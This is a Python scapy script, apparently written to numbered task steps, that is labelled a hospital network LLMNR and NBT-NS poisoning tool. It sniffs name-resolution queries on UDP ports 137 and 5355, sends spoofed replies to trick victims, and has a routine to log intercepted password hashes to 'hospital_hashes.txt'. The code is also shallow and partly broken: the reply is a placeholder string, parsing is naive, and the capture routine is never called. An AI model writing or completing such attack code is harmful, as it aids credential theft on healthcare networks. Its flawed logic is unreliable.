import scapy.all as scapy
import socket
import sys  # Import sys for handling script exits

# Define the network interface to listen on
INTERFACE = "eth0"


def capture_credentials(data):
    """
    Task 5: Capture and log authentication attempts.
    Stores intercepted hashes in a file for later analysis.
    """
    with open("hospital_hashes.txt", "a") as file:
        file.write(data + "\n")
    print("[+] Captured credentials saved")


def send_spoofed_response(packet):
    """
    Task 4: Send a spoofed response to trick victims.
    Constructs a packet destined for the requester's IP and port.
    """
    response_packet = scapy.IP(dst=packet[scapy.IP].src) / \
                      scapy.UDP(dport=packet[scapy.UDP].sport) / \
                      scapy.Raw(load="FAKE_RESPONSE")
    scapy.send(response_packet, verbose=False)
    print("[+] Spoofed response sent")


def process_packet(packet):
    """
    Task 4: Process captured packets and check for LLMNR or NBT-NS requests.
    Identifies if the packet contains a name query to be spoofed.
    """
    if packet.haslayer(scapy.UDP) and packet.haslayer(scapy.Raw):
        payload = packet[scapy.Raw].load.decode(errors="ignore")
        if "QUERY" in payload:
            print(f"[!] Detected request for: {payload}")
            send_spoofed_response(packet)


def sniff_requests():
    """
    Task 4: Sniff LLMNR and NBT-NS requests on the network.
    Uses filters for UDP ports 137 (NetBIOS) and 5355 (LLMNR).
    """
    print("[*] Listening for LLMNR and NBT-NS requests...")
    scapy.sniff(iface=INTERFACE, filter="udp port 137 or udp port 5355", prn=process_packet, store=False)


def main():
    """
    Task 7: Execute the script and allow for a safe exit.
    Wraps the sniffer in a try/except block to handle manual termination.
    """
    try:
        print("[*] Starting hospital network LLMNR and NBT-NS poisoning script...")
        sniff_requests()
    except KeyboardInterrupt:
        print("\n[!] Script terminated by user.")
        sys.exit(0)


if __name__ == "__main__":
    main()